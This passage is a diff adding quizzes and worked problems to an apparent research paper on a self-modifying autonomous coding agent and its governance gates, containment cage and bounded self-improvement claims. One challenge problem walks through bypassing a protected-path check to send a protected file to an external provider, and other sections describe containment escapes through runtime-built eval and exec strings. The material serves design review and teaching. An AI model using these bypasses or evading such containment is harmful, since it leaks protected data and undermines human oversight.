+<p><strong>D.</strong> The route gate returns an empty list for background and speculative routes regardless of the other gates, because those routes target text-only, cost-optimized models. See §84.4 and §85.3.</p>
+</details>
+</div>
+<div class="mcq" data-answer="1">
+<p class="mcq-q">3. An operator attaches a PDF to an op that ends up on DoubleWord. What happens?</p>
+<ol class="mcq-options" type="A">
+<li>The PDF is dropped with a WARNING and the op continues.</li>
+<li>The PDF is converted to one image per page.</li>
+<li>The request is sent and DoubleWord returns a 400 error.</li>
+<li>The op is automatically rerouted to Claude.</li>
+</ol>
+<details class="mcq-why"><summary>Show answer</summary>
+<p><strong>A.</strong> The OpenAI-compatible schema is image-only, so the serializer drops PDFs with a WARNING and keeps any image attachments. PDF-to-image conversion is future work, and forcing Claude needs <code>JARVIS_PROVIDER_OVERRIDE=claude-api</code>. See §85.2 and §89.5.</p>
+</details>
+</div>
+<div class="mcq" data-answer="3">
+<p class="mcq-q">4. Why is the per-attachment cap 10 MiB when Anthropic accepts PDFs up to 32 MiB?</p>
+<ol class="mcq-options" type="A">
+<li>DoubleWord rejects anything larger than 10 MiB.</li>
+<li>The macOS Vision framework cannot read larger files.</li>
+<li>It matches the image budget and leaves headroom after base64 inflation.</li>
+<li>It was lowered from 32 MiB after a payload-oversize incident.</li>
+</ol>
+<details class="mcq-why"><summary>Show answer</summary>
+<p><strong>C.</strong> 10 MiB matches the image budget, forces pre-summarizing large documents, and inflates to roughly 14 MiB in base64, leaving room for the prompt scaffold under 32 MiB. The cap was not changed during the arc. See §84.2.</p>
+</details>
+</div>
+</div>
+<p class="engage-kicker">Problem set</p>
+<div class="pset" id="pset-part-xv">
+<div class="problem">
+<p class="problem-q"><strong>Problem 1 (trace).</strong> An operator types <code>/attach /tmp/claude/bug.png "what is misaligned here?"</code> in SerpentFlow. Trace the file from the REPL to the Claude request, naming each check it passes and the two log lines you could grep for afterwards.</p>
+<details class="problem-hint"><summary>Hint</summary>
+<p>Follow §83.2, then the hoist in §83.3, then the gates in §84.4 and the block shape in §85.1. The log lines are in §85.4.</p>
+</details>
+<details class="problem-sol"><summary>Worked solution</summary>
+<p><code>SerpentFlow._handle_attach()</code> parses the path and description, then runs the validation perimeter: absolute path, file exists, extension in <code>_ATTACHMENT_EXT_TO_MIME</code>, size within the 10 MiB default, and <code>_is_protected_path(path)</code> returns None (§83.2). It builds an envelope with <code>source="voice_human"</code>, empty <code>target_files</code>, and <code>evidence["user_attachments"]</code>, and calls the intake router's <code>ingest</code>.</p>
+<p>In <code>_dispatch</code>, the hoist reads <code>user_attachments</code>, calls <code>Attachment.from_file(path, kind="user_provided")</code>, which computes <code>hash8</code> and infers <code>image/png</code>, and logs <code>[IntakeRouter] attachments_hoisted ... kind=user_provided</code>. The context gets the tuple via <code>with_attachments</code> (§83.3).</p>
+<p>At GENERATE, <code>_serialize_attachments()</code> checks the purpose is allowed, the kill switch is on, attachments exist, and the route is not BG or SPEC, then reads the bytes within budget (§84.4). For Claude it emits an image block, and <code>_generate_raw</code> places it before the text block (§85.1). The provider logs <code>[ClaudeProvider] multi_modal op=... blocks=1 ... mime_kinds=[image/png]</code> (§85.4, §90.2). Grepping the op id finds both lines.</p>
+</details>
+</div>
+<div class="problem">
+<p class="problem-q"><strong>Problem 2 (design).</strong> A teammate wants to raise the attachment cap to 32 MiB so long PDFs fit, arguing "Anthropic allows it". Using §84.2, §88 and §89.6, argue for or against, and suggest a better path for long documents.</p>
+<details class="problem-hint"><summary>Hint</summary>
+<p>Consider base64 inflation, the prompt scaffold, and what §88 says about relaxing gates.</p>
+</details>
+<details class="problem-sol"><summary>Worked solution</summary>
+<p>Against. At 10 MiB the base64 payload is about 14 MiB, leaving headroom under Anthropic's 32 MiB limit for system text and tool manifests (§84.2). A 32 MiB file would inflate well past 32 MiB and risk a payload-oversize 400.</p>
+<p>The paper also treats the cap as a hard gate. It says relaxing a safety budget to fit a new code path is the anti-pattern that Manifesto §6 forbids, and §88 confirms none of the gates were relaxed.</p>
+<p>Even within the cap, §89.6 notes that a long PDF sent as one block can push token counts above the context window. The better path is the future work it describes: per-page extraction with page-range arguments to <code>/attach</code>, or operators pre-summarizing large documents, which the cap already encourages.</p>
+</details>
+</div>
+<div class="problem">
+<p class="problem-q"><strong>Problem 3 (code reading).</strong> Open <code>backend/core/ouroboros/governance/providers.py</code> and find <code>_serialize_attachments</code> (search for <code>_ATTACHMENT_PURPOSES_ALLOWED</code>). List the early-return checks in the order they appear, and compare them with the five gates named in §84.4. Is there a check in the code that the paper's list does not name?</p>
+<details class="problem-hint"><summary>Hint</summary>
+<p>Read from the line <code>if purpose not in _ATTACHMENT_PURPOSES_ALLOWED</code> down to where the <code>blocks</code> list is created.</p>
+</details>
+<details class="problem-sol"><summary>Worked solution</summary>
+<p>The function returns an empty list, in order, when: the purpose is not in <code>_ATTACHMENT_PURPOSES_ALLOWED</code> (which holds <code>sensor_classify</code>, <code>visual_verify</code> and <code>generate</code>); the purpose is <code>generate</code> and <code>_generate_attachments_enabled()</code> is false; <code>ctx.attachments</code> is empty; the route is in <code>_ATTACHMENT_STRIPPED_ROUTES</code>; and the provider kind is not in <code>_ATTACHMENT_PROVIDER_KINDS</code>.</p>
+<p>The first four match §84.4's known-purpose, env-kill, non-empty ctx and live-route gates. The fifth paper gate, the per-attachment read budget, happens later inside the loop when bytes are read.</p>
+<p>The unknown-provider-kind check is in the code but not in the paper's list of five. It logs at DEBUG and drops all attachments for a provider that is not Claude, DoubleWord or J-Prime.</p>
+<p>One more drift is worth noticing: the function's docstring still says purpose must be <code>sensor_classify</code> or <code>visual_verify</code>, while the allow-list constant includes <code>generate</code>. The constant is what runs.</p>
+</details>
+</div>
+</div>
+<p class="engage-kicker engage-kicker-adv">Advanced conceptual questions</p>
+<details class="cq-adv"><summary>A1. §91 claims "true CC-parity" for seeing a screenshot of a bug. The proof in §87 ran on Claude. Under the October configuration in §93.6, which parts of that claim still hold, and what live test would re-establish it?</summary>
+<p>The intake half still holds, because it does not depend on the provider. Both ingress paths still converge on <code>ctx.attachments</code> (§83), and the hoist, the Attachment schema and the five gates do not change with the lane. The provider half is different. With <code>JARVIS_PAID_LANES_ENABLED=false</code>, Claude is never constructed (§93.6), so the <code>document</code> and <code>image</code> blocks of §85.1 are never sent.</p>
+<p>The only active lane is J-Prime. For <code>jprime</code> the serializer emits OpenAI-style <code>image_url</code> blocks and drops PDFs with a WARNING (§85.2, §89.5). So a PDF attached today is dropped, and the op runs text-only. The §85.2 escape hatch, <code>JARVIS_PROVIDER_OVERRIDE=claude-api</code>, names a provider the paid-lane authority keeps switched off.</p>
+<p>Images are the open case. They would be sent, but the model serving code generation is <code>qwen3-coder-ov:30b</code>, and §93.6 says the vision model (<code>jarvis-vision:8b</code>) is declared in J-Prime but at the time of writing is still partly served by Ollama. The paper gives no live-fire proof that the local lane reasons over image bytes at GENERATE.</p>
+<p>So in October the parity claim holds for the architecture and is unproven for behaviour. The test that would settle it is the §87 method on the local lane: an image with a unique, unguessable string, run through <code>scripts/attach_livefire.py</code>, passing only if the reply quotes the string verbatim. It would also need both breadcrumbs from §85.4 under one <code>op_id</code>. Note that the §85.4 line is labelled <code>[ClaudeProvider]</code>, so the breadcrumb to grep for may differ on J-Prime.</p>
+</details>
+<details class="cq-adv"><summary>A2. The intake hoist fails closed by demoting a broken attachment op to text-only, logged at DEBUG (§83.3). §93.12 later added capability assurance, which refuses to run below the declared envelope instead of degrading silently. Should an <code>/attach</code> op whose file vanished still run? Argue it per kind.</summary>
+<p>The two principles conflict here. §83.3 chose availability: a stale frame, a deleted file or a failed mime check must not break intake, so the op still enters CLASSIFY without pixels. §93.12's capability assurance chose honesty: an operation should not run with less than it declared it needs.</p>
+<p>My position (a proposal, not described in the paper) is to decide by kind. For <code>sensor_frame</code>, demotion is right. The useful signal has already been pulled out at the sensor: OCR text, the Tier-1 verdict and the matches travel in <code>evidence["vision_signal"]</code> (§83.1). A text-only op can still act on "a traceback is on screen", and Ferrari may have died between scan and intake (§89.1).</p>
+<p>For <code>user_provided</code>, demotion is misleading. The operator asked something like "what is misaligned here?" about a specific file (§90.2). Without the image the model answers a different question, and the operator has no visible sign of it because the only trace is a DEBUG line. That is the silent degradation §93.12 exists to refuse. The better behaviour is to fail the op visibly back to the REPL.</p>
+<p>The evidence to settle it is already in the logs. Using the §90.3 grep rollup, count envelopes that carried <code>user_attachments</code> but have no matching <code>attachments_hoisted</code> line, and check whether their answers referred to the missing content. If that count is near zero, the question is academic. If not, the per-kind split matters.</p>
+</details>
+<details class="cq-adv"><summary>A3. The multi-modal arc needed five contract fixes before one signal could be emitted (§82.2), even though every component existed. Connect this to §87's live-fire method and §93.12's DARK-feature finding. What general rule about proof does the paper end up adopting?</summary>
+<p>Every component in §82.1 worked on its own terms. The frame server wrote frames, the sensor scanned, the serializer could encode blocks. Each producer and consumer pair disagreed on one detail: the filename, the timestamp key, the hash format, a missing <code>ocr_fn</code>, and a purpose allow-list without <code>"generate"</code>. Each mismatch failed silently, for example <code>ferrari_absent</code> every 60 s while Ferrari was healthy, or <code>no_regex_match ocr_chars=0</code>. Unit tests on either side would pass, because each side matched its own idea of the contract.</p>
+<p>§87 answers this with an end-to-end behavioural test. Real bytes go to the real API, and the test passes only if the reply contains a string that could not have been guessed. No single-side test can pass that check by agreeing with itself.</p>
+<p>§93.12 shows the same pattern at system scale: 131 features with the flag on, the module present, and no production caller. The reachability ledger's three stages (registered, invoked, effective) apply §82.2's lesson to every feature. The arc's own unblocking step was the same idea in small form: commit <code>44305f7e96</code> instrumented the silent-skip paths before deeper debugging (§88).</p>
+<p>The general rule is that a capability counts as present only when a live run shows it being invoked and having its effect. Having the code, the flag and the unit tests is not enough. §93.10's "first-order proof" applies the same standard to commits: an autonomous landing counts only when it did real work for a signed goal and git confirms it.</p>
+</details>
+<p class="engage-kicker engage-kicker-adv">Challenge problems</p>
+<div class="pset pset-adv">
+<div class="problem problem-adv">
+<p class="problem-q"><strong>Challenge 1 (adversarial).</strong> §83.2 says <code>/attach</code> reuses Venom's <code>_is_protected_path()</code> as step 5 of its validation perimeter. Write an envelope that gets a file inside a protected location sent to a provider at GENERATE without going through that check. You may use any producer the paper shows calling <code>router.ingest</code>. Identify every gate it passes, and say whether anything in the paper's design stops it. (Reference: the hoist is in <code>backend/core/ouroboros/governance/intake/unified_intake_router.py</code>, and <code>Attachment.from_file</code> is in <code>backend/core/ouroboros/governance/op_context.py</code>.)</p>
+<details class="problem-hint"><summary>Hint</summary>
+<p>Compare where the protected-path check runs (§83.2) with where the hoist builds Attachments (§83.3). §87.2 shows a producer that builds the envelope itself.</p>
+</details>
+<details class="problem-sol"><summary>Worked solution</summary>
+<p><strong>Where the check lives.</strong> In §83.2, the protected-path check is step 5 inside <code>SerpentFlow._handle_attach()</code>, at the REPL edge. The hoist in §83.3 reads <code>evidence["user_attachments"]</code> and calls <code>Attachment.from_file(path, kind="user_provided")</code> directly. In the repo, the hoist in <code>unified_intake_router.py</code> calls <code>from_file</code> with no protected-path call, and <code>from_file</code> in <code>op_context.py</code> checks only for a non-empty absolute path, that the file exists, and that the extension is whitelisted. A search finds no <code>_is_protected_path</code> call in the intake router.</p>
+<p><strong>The envelope.</strong> §87.2 shows <code>scripts/attach_livefire.py</code> building an <code>IntentEnvelope</code> with <code>make_envelope()</code> and calling <code>router.ingest()</code> itself, with no REPL. Any in-process producer can do the same, including a future ingress like the Slack webhook §83.4 anticipates. Give it <code>source="voice_human"</code>, <code>urgency="critical"</code>, empty <code>target_files</code> (allowed because <code>user_attachments</code> is present, §86 commit 12c), and one entry whose path is an absolute path under a protected directory with a <code>.png</code> or <code>.pdf</code> extension and a size of 10 MiB or less.</p>
+<p><strong>Gates it passes.</strong> At the hoist: absolute path, file exists, whitelisted extension, mime inferred from the extension, and <code>hash8</code> computed from the bytes. In <code>__post_init__</code>: kind, mime, hash format and path length are all valid (§84.1). In the serializer (§84.4): the purpose is <code>generate</code>, the kill switch is on by default, the context is non-empty, and the route is IMMEDIATE, not BG or SPEC (critical plus voice_human, §87.5). The per-attachment read is within 10 MiB. Then the bytes are base64-encoded and sent.</p>
+<p><strong>What stops it.</strong> Nothing in the paper's design, for any file that has a whitelisted extension. The extension whitelist does narrow the target: a file such as <code>.env</code> has no whitelisted extension, so <code>from_file</code> raises and the hoist demotes the op to text-only. Note also that the mime type comes from the extension, not from the file's content, so any bytes renamed to <code>.png</code> pass the schema.</p>
+<p>A proposed fix (not in the paper): run <code>_is_protected_path()</code> inside the hoist or inside <code>from_file</code> for <code>user_provided</code>, so every ingress inherits the check. This matches §83.4's own rule that new ingresses only add a <code>kind</code> at the hoist. Today a new ingress would have to remember to call the check itself. Check your answer by asking which layer is reached by every producer: only the hoist is.</p>
+</details>
+</div>
+<div class="problem problem-adv">
+<p class="problem-q"><strong>Challenge 2 (quantitative).</strong> §84.1 allows up to 8 attachments per context (<code>_ATTACHMENT_MAX_PER_CTX</code>), and each may be up to 10 MiB. §84.2 says 10 MiB inflates to about 14 MiB of base64, "well below" the 32 MiB Anthropic limit. Compute the worst-case payload for a full context, find the largest number of maximum-size attachments that still fits under 32 MiB, and say which of the five gates in §84.4 would stop an oversize request. What happens if a ninth attachment is supplied?</p>
+<details class="problem-hint"><summary>Hint</summary>
+<p>Base64 turns every 3 bytes into 4. Check whether any gate in §84.4 looks at the total across attachments.</p>
+</details>
+<details class="problem-sol"><summary>Worked solution</summary>
+<p><strong>Per attachment.</strong> 10 MiB x 4/3 = about 13.3 MiB of base64. The paper rounds this to about 14 MiB.</p>
+<p><strong>Full context.</strong> 8 x 13.3 = about 107 MiB (8 x 14 = 112 MiB with the paper's rounding), before any prompt scaffold. That is more than three times the 32 MiB figure.</p>
+<p><strong>Largest set that fits.</strong> Two maximum-size attachments are about 26.7 MiB, leaving about 5.3 MiB for the system text and tool manifests. Three are about 40 MiB, which is over the limit. So the safety margin in §84.2 holds for one attachment, and roughly for two. From three upwards it does not.</p>
+<p><strong>Which gate stops it.</strong> None of the five. Known-purpose, env-kill, non-empty context and live-route are all yes/no checks. The read budget is per attachment: each file is read with the 10 MiB cap, and in the repo <code>_serialize_attachments</code> in <code>providers.py</code> calls <code>att.read_bytes()</code> for each attachment without any running total. The 8-per-context cap counts attachments, not bytes. So a three-attachment op reaches the provider and risks exactly the payload-oversize 400 that §84.2 says the budget is meant to avoid.</p>
+<p><strong>A ninth attachment.</strong> In <code>op_context.py</code>, <code>with_attachments</code> raises if there are more than <code>_ATTACHMENT_MAX_PER_CTX</code> entries. The hoist wraps everything in one try/except (§83.3), so the whole hoist fails and the op runs with zero attachments, not eight. A request over the count limit loses everything, while a request over the byte limit is sent anyway.</p>
+<p>A proposed fix (not in the paper): add an aggregate byte budget in the serializer, derived from the provider's payload limit minus a scaffold reserve. Over budget, drop the later attachments with a WARNING, which matches §88's rule that a violating attachment is "dropped at the nearest boundary with a WARNING log". Check: 2 x 10 MiB x 4/3 = 26.7 MiB is less than 32, and 3 x 10 x 4/3 = 40 is more.</p>
+</details>
+</div>
+</div>
+</div>
+<!-- engage:end -->
+
 ---
 
 ## §92. Recent Developments (April 17 – May 13, 2026)
@@ -4479,6 +7019,16 @@ Three substrates that had been shadow-mode since the 2026-04-16 stamp graduated 
 3. **FlagRegistry + /help dispatcher** (`flag_registry.py`, `help_dispatcher.py`). Typed registry for 481+ `JARVIS_*` env flags (52 curated seed), each carrying type + category (8 slots) + source_file + example + posture-relevance (CRITICAL/RELEVANT/IGNORED). Bounded Levenshtein typo detection (`JARVIS_POSTUR_ENABLED` → suggests `JARVIS_POSTURE_ENABLED`).
 
 The three are wired in series: FlagRegistry seeds 13 governor flags automatically; the governor consumes posture-weights from DirectionInferrer; both feed the IDE observability surface from §92.2. Detail: `memory/project_direction_inferrer_graduation.md`, `project_sensor_governor_graduation.md`, `project_flag_registry_graduation.md`.
+
+<!-- engage:begin -->
+<aside class="checkpoint" id="cp-s92-1">
+<p class="cp-label">Pause and predict</p>
+<p class="cp-q">One battle-test session hung in GENERATE for over an hour because provider retry storms kept resetting the per-op idle counter. What kind of guard would stop this, and what signal must that guard refuse to listen to?</p>
+<details class="cp-a"><summary>Reveal the answer</summary>
+<p>A hard wall-clock ceiling, <code>--max-wall-seconds</code>, which fires <code>stop_reason=wall_clock_cap</code> when the session runs too long. It is deliberately opaque to any activity signal, so a retry storm that looks like activity cannot keep resetting it. That is exactly how session #7 GENERATE S2 hung for 67+ minutes. Graduation soaks now set it, typically to 2400 s, about twice the 850–1300 s happy path. See §92.4.</p>
+</details>
+</aside>
+<!-- engage:end -->
 
 ### §92.4 Battle-Test Harness Hardening + Adversarial Cage (2026-04-23 / 2026-04-27)
 
@@ -4730,6 +7280,16 @@ The four-week window aligns O+V with five published research threads at increasi
 
 **Summary of the five threads.** Two of the five (formal verification, benchmarks) have direct citation→implementation closures landed in §92 — Treefinement L2 (§92.13, AlphaVerus ported) and the SWE-Bench-Pro harness binding (§92.14). The other three (RSI / constitutional safety / recursion-bounding) are positioned structurally — the substrate is in place and the autonomous-ledger-write primitive is operationally proven, but the *full* empirical regime each thread benchmarks (SICA-style governance self-modification, Constitutional-Classifiers-scale jailbreak suppression, ASL-4 recursion-bound stability under stress) is gated on Phase 9 graduation soaks rather than already-shipped. What remains across all three is the *formal* proof of the containment property the substrate's design embodies. That is the dissertation's load-bearing claim, sketched in §92.17 and contextualized in §92.18.
 
+<!-- engage:begin -->
+<aside class="checkpoint" id="cp-s92-2">
+<p class="cp-label">Pause and predict</p>
+<p class="cp-q">§92.16 says the autonomy actually demonstrated so far is 23 graduation-ledger commits, not governance self-modification. Will the next section present the bounded-RSI claim as a proven theorem, a proof outline, or something weaker?</p>
+<details class="cp-a"><summary>Reveal the answer</summary>
+<p>Something weaker: a conjecture sketch. The section states three properties: shell deterministic-entropy never decreases, core semantic-entropy conditioned on the shell never increases, and net agentic entropy stays bounded. It then says plainly that none of them is a theorem yet. Turning them into a precise statement and a proof outline is named as the next milestone. See §92.17.</p>
+</details>
+</aside>
+<!-- engage:end -->
+
 ---
 
 ### §92.17 The Reverse Russian Doll — From Architectural Pattern Toward Formal Sketch
@@ -4790,6 +7350,162 @@ The four-week window covered by §92 sits between **Mechanic and Neurosurgeon**.
 **The Penn inflection point.** The Mechanic → Neurosurgeon transition is precisely the threshold where engineering ceases to be *sufficient* and formal methods become *load-bearing*. Before Neurosurgeon, the substrate can be proven sound by adversarial soaking (the Adversarial Cage's 0/38 result is the empirical proof). At and beyond Neurosurgeon, the system modifies its own governance — and only a formal proof of containment, not empirical observation, can rule out the existence of a modification trajectory that escapes the bound. **This is the gap the MSE-AI program is positioned to fill** — not by replacing the engineering substrate, but by providing the mathematical apparatus to prove what the substrate empirically already does, in time for the Neurosurgeon → next-Order transition to be safely attempted.
 
 The empirical demonstrations are stable. The formal arc has been opened. The four-week window of §92 was the last engineering inflection before the formal one — and §92 itself is the bridge between this paper's empirical substrate (§1 — §91) and the dissertation's formal conversion. The conversion is the next research arc, and Penn is where it is positioned to be done.
+
+<!-- engage:begin -->
+#### Check your understanding: §92 — Recent Developments (April 17 – May 13, 2026)
+
+<div class="engage" id="engage-s92">
+<p class="engage-kicker">Conceptual questions</p>
+<details class="cq"><summary>1. Why do Treefinement L2 and the SWE-Bench-Pro harness ship with default-FALSE master flags and a clean-soak graduation criterion, instead of being switched on once their tests pass?</summary>
+<p>Passing tests shows that the code does what it was written to do. It does not show that the capability helps the live organism. The graduation contract in §92.15 says no capability graduates without empirical proof, and that proof comes from a clean-soak ladder, not from hand-tuning. Treefinement must show at least a 10% L2 success-rate lift, or at least a 20% wall-clock reduction at the same success rate, over at least two consecutive soaks (§92.13). Keeping the flag off also keeps rollback byte-identical: the legacy <code>_run_inner</code> is sha256-pinned, so turning the flag off restores exactly the old behaviour. The trade-off is speed. Capability sits dormant for weeks, as the 36-day minimum calendar in §92.9 shows.</p>
+</details>
+<details class="cq"><summary>2. The Adversarial Cage reported 0/38 escapes. What does this result support, and what does the paper itself say it cannot establish?</summary>
+<p>It supports the claim that the Iron Gate, Semantic Guardian and recursion bound stopped every one of 38 hand-authored attacks, with 12 detection gaps documented as predicted, not active (§92.4). It is a curated, hand-written set, so it is evidence about those inputs, not a measured escape rate across all possible attacks. §92.12 calls the cage "empirically zero-escape" and lists proving this as a formal property as an open question. §92.18 makes the limit explicit. Before Neurosurgeon, adversarial soaking can stand in for proof. Once the system modifies its own governance, only a formal proof can rule out a trajectory that escapes the bound.</p>
+</details>
+<details class="cq"><summary>3. IDE-native ReviewBranch builds preview branches with git plumbing and auto-rejects after 300 s. Why these two choices?</summary>
+<p>The plumbing commands <code>hash-object</code>, <code>commit-tree</code> and <code>branch</code> create a reviewable branch without touching the working tree, HEAD or the operator's index (§92.5). An autonomous proposal therefore never disturbs the human's own work in progress, yet VS Code's source-control panel still shows it natively. The 300 s default timeout ends in auto-REJECT, not auto-apply. If nobody looks, nothing lands. That replaces the old path, where a 5 s Rich overlay was followed by an automatic apply. The old behaviour is still available by setting <code>JARVIS_REVIEW_TIMEOUT_S=0</code>, so the safer default does not remove the operator's choice.</p>
+</details>
+<p class="engage-kicker">Quiz</p>
+<div class="quiz" id="quiz-s92">
+<div class="mcq" data-answer="3">
+<p class="mcq-q">1. According to §92.16, what autonomous commits had been empirically demonstrated as of 2026-05-14?</p>
+<ol class="mcq-options" type="A">
+<li>Autonomous edits to <code>iron_gate.py</code> that survived the full cycle</li>
+<li>Production-code repairs landed under signed roadmap goals</li>
+<li>23 commits appending soak verdicts to the graduation ledger</li>
+<li>Resolved SWE-Bench-Pro instances committed without review</li>
+</ol>
+<details class="mcq-why"><summary>Show answer</summary>
+<p><strong>C.</strong> The demonstrated regime is autonomous ledger writes: 23 commits against <code>passb_graduation_ledger.jsonl</code>. Fully autonomous governance self-modification is listed explicitly as not yet demonstrated (§92.16, §92.18).</p>
+</details>
+</div>
+<div class="mcq" data-answer="1">
+<p class="mcq-q">2. In the 2026-05-10 debug arc, <code>httpx</code> needed <code>socksio</code> behind a <code>socks5h://</code> tunnel. What was the structural fix?</p>
+<ol class="mcq-options" type="A">
+<li>Install and pin <code>socksio==1.0.0</code>, keeping the proxy</li>
+<li>Strip the proxy from the environment before each call</li>
+<li>Downgrade <code>httpx</code> below 0.28 to avoid the dependency</li>
+<li>Route DoubleWord calls through a separate DNS resolver</li>
+</ol>
+<details class="mcq-why"><summary>Show answer</summary>
+<p><strong>A.</strong> The first attempt stripped the proxy and broke DNS. The structural fix was to install the missing package, pinned in <code>requirements.txt</code> (§92.10, Layer 4).</p>
+</details>
+</div>
+<div class="mcq" data-answer="4">
+<p class="mcq-q">3. Why was UX Gap #5 re-diagnosed as a phantom during the Live Status Line work?</p>
+<ol class="mcq-options" type="A">
+<li>The REPL had been running headless in every session</li>
+<li>The op block buffer already pruned stale entries on eviction</li>
+<li>The SSE stream already rendered status in the IDE extensions</li>
+<li><code>patch_stdout(raw=True)</code> already handled interleaved output</li>
+</ol>
+<details class="mcq-why"><summary>Show answer</summary>
+<p><strong>D.</strong> Async output interleaving during typing was already handled. What was really missing was the status line itself (§92.5, item 4).</p>
+</details>
+</div>
+<div class="mcq" data-answer="2">
+<p class="mcq-q">4. What does the SWE-Bench-Pro Phase C scorer do with a patch that modifies a test file, and why is that flag special?</p>
+<ol class="mcq-options" type="A">
+<li>Scores it as inconclusive; it is the only flag set per instance</li>
+<li>Fails it outright; it is the only Phase C flag defaulting TRUE</li>
+<li>Reverts the test edit and rescores; it is AST-pinned to the scorer</li>
+<li>Sends it to operator review; it mirrors the Orange PR lane</li>
+</ol>
+<details class="mcq-why"><summary>Show answer</summary>
+<p><strong>B.</strong> Test-file modification is treated as a cheat under the upstream rubric. Rubric integrity depends on catching it, so it is the one Phase C flag that defaults TRUE (§92.14).</p>
+</details>
+</div>
+</div>
+<p class="engage-kicker">Problem set</p>
+<div class="pset" id="pset-s92">
+<div class="problem">
+<p class="problem-q"><strong>Problem 1 (trace).</strong> A Yellow-tier (<code>NOTIFY_APPLY</code>) operation produces a two-file diff at 14:00, and the operator is away from the keyboard until 14:10. Using §92.5, trace what happens to the diff, what the operator could see in their editor, and what state the repository is in at 14:10.</p>
+<details class="problem-hint"><summary>Hint</summary>
+<p>Look at which git objects ReviewBranch creates, what it never touches, and what its default timeout does.</p>
+</details>
+<details class="problem-sol"><summary>Worked solution</summary>
+<p>ReviewBranch replaces the old 5 s overlay-then-apply path. It writes the candidate as git objects with <code>hash-object</code> and <code>commit-tree</code>, then creates a preview branch with <code>branch</code>. The working tree, HEAD and the operator's index are never touched.</p>
+<p>The diff is recorded in the <code>DiffArchive</code> ring with a monotonic <code>d-N</code> reference, so it can be expanded later. VS Code's source-control panel shows the preview branch natively, and the SSE events reach the IDE.</p>
+<p>The default <code>JARVIS_REVIEW_TIMEOUT_S</code> is 300 s. With no decision by about 14:05 the review auto-REJECTs. At 14:10 the working tree is unchanged, the candidate was never applied, and its audit record remains in the archive. Only with the timeout set to 0 would the legacy auto-apply have landed it (§92.5).</p>
+</details>
+</div>
+<div class="problem">
+<p class="problem-q"><strong>Problem 2 (design).</strong> A contributor proposes that <code>--max-wall-seconds</code> extend itself automatically whenever an operation is making progress, for example when the provider is still returning events, so that slow but healthy sessions are not cut off. Using §92.4, critique the proposal and suggest what to do about slow sessions instead.</p>
+<details class="problem-hint"><summary>Hint</summary>
+<p>Ask which failure the wall-clock cap was built for, and what that failure looked like from the inside.</p>
+</details>
+<details class="problem-sol"><summary>Worked solution</summary>
+<p>The cap exists because an activity-based guard was already defeated once. Provider retry storms reset the per-op liveness counter, and session #7 GENERATE S2 hung for 67+ minutes while looking busy (§92.4).</p>
+<p>A cap that extends on "progress" brings back the same weakness. A retry storm emits events, so it looks like progress and the cap never fires. The paper says the cap is "opaque to any activity signal" precisely so that it cannot be defeated this way.</p>
+<p>The answer for slow but healthy sessions is a larger fixed margin. Graduation soaks use about 2400 s, roughly twice the 850–1300 s happy path. The ceiling stays a pure function of elapsed time, so no state inside the system it guards can hold it open.</p>
+</details>
+</div>
+<div class="problem">
+<p class="problem-q"><strong>Problem 3 (code reading).</strong> §92.1 describes the mutation cage as a "structural COUNT gate (second-rejection after the type gate)". Open <code>backend/core/ouroboros/governance/scoped_tool_backend.py</code> and find the count gate. Answer three questions: in what order the two gates run, at what moment a mutation slot is consumed, and what happens to the slot if the inner backend then fails.</p>
+<details class="problem-hint"><summary>Hint</summary>
+<p>Search for <code>mutation_budget_exhausted</code> and read the lines just after the refusal block.</p>
+</details>
+<details class="problem-sol"><summary>Worked solution</summary>
+<p>Layer 1 is the type gate. A tool outside the dispatched <code>allowed_tools</code> set is refused as <code>POLICY_DENIED</code> before anything else runs. Layer 2, marked "count gate (mutation budget)", runs only for mutation tools. If <code>_mutations_count</code> has reached <code>_max_mutations</code>, it logs <code>reason=mutation_budget_exhausted</code> and returns <code>POLICY_DENIED</code>, noting that the budget is set at dispatch and cannot be extended mid-op.</p>
+<p>Otherwise the slot is consumed <em>before</em> the call is delegated: <code>self._mutations_count += 1</code>. The comment explains that a failure inside the inner backend still burns the slot on purpose. This stops a model from retrying a failing mutation until it exceeds the budget.</p>
+<p>The call is also recorded and <code>_sync_state_mirror()</code> is updated before delegation. That is the <code>state_mirror</code> behaviour §92.1 credits with keeping the audit trail intact across a hard kill.</p>
+</details>
+</div>
+</div>
+<p class="engage-kicker engage-kicker-adv">Advanced conceptual questions</p>
+<details class="cq-adv"><summary>A1. Property (a) of the bounded-RSI conjecture in §92.17 says the shell's deterministic entropy never decreases, because every accepted patch only adds to it. Read that claim against what §93.8 and §93.12 found five months later. Does the evidence support (a), contradict it, or show that the quantity is badly defined?</summary>
+<p>The evidence mostly shows that the quantity is badly defined. §92.17 counts the shell as the constraints that exist: rules, detectors, AST pins and tests. §93 shows that existing and acting are different things. §93.12 found 131 DARK features, with the flag on and the module on disk but nothing in production importing it. §93.8 found VALIDATE rungs that existed but did nothing: 524 byte-identical retry iterations re-validated a frozen pool, and 532 micro-fix runs made zero repairs. Self-critique was dying on 38 of 38 operations.</p>
+<p>Measured as code on disk, the shell grew. Measured as constraints actually applied to candidates, it was much smaller than it looked, and parts of it could switch off without any code being removed. Something did shrink as code, too: the inline VALIDATE twin and its kill switch were deleted (§93.8), even though that probably strengthened the shell by leaving one owner.</p>
+<p>§93.3 adds a second problem. Property (b) is stated only "in the dimensions S<sub>n</sub> now bounds". The at-scale escape rate of about 8.8% comes from runtime-built strings passed to <code>eval</code>, <code>exec</code>, <code>subprocess</code> and <code>pickle</code>, a dimension a static cage cannot bound by construction. So (b) is not contradicted, but it says nothing about the dimension that matters most.</p>
+<p>My position is that (a) is only testable if deterministic entropy is defined over effective constraints. The reachability ledger's registered → invoked → effective states (§93.12) are the instrument for that. The evidence that would settle it is a time series of effective-constraint counts across soaks. Any drop, for example a capability going DARK, falsifies (a) as a claim about the running system, even if it holds for the source tree.</p>
+</details>
+<details class="cq-adv"><summary>A2. §92.16 says the substrate is "positioned to close the SICA-empirical gap on a multi-month timeline", conditional on Phase 9 flag graduation. Use §93 to judge that forecast. What came true, what did not, and what does the difference say about the gap between "structurally ready" and "capable"?</summary>
+<p>Part of it came true. By 2026-10-10 there were 91 autonomous landings on <code>main</code>, five of them production code, and three of those modified files inside the governance package under signed goals (§93.10). That is well past the 23 ledger-write commits that were the whole empirical record in §92.16.</p>
+<p>The rest did not happen. §93.10 says the system is still at Mechanic. No landing touched a safety gate, and none was self-initiated governance change, which is the SICA-style regime §92.16 had in view.</p>
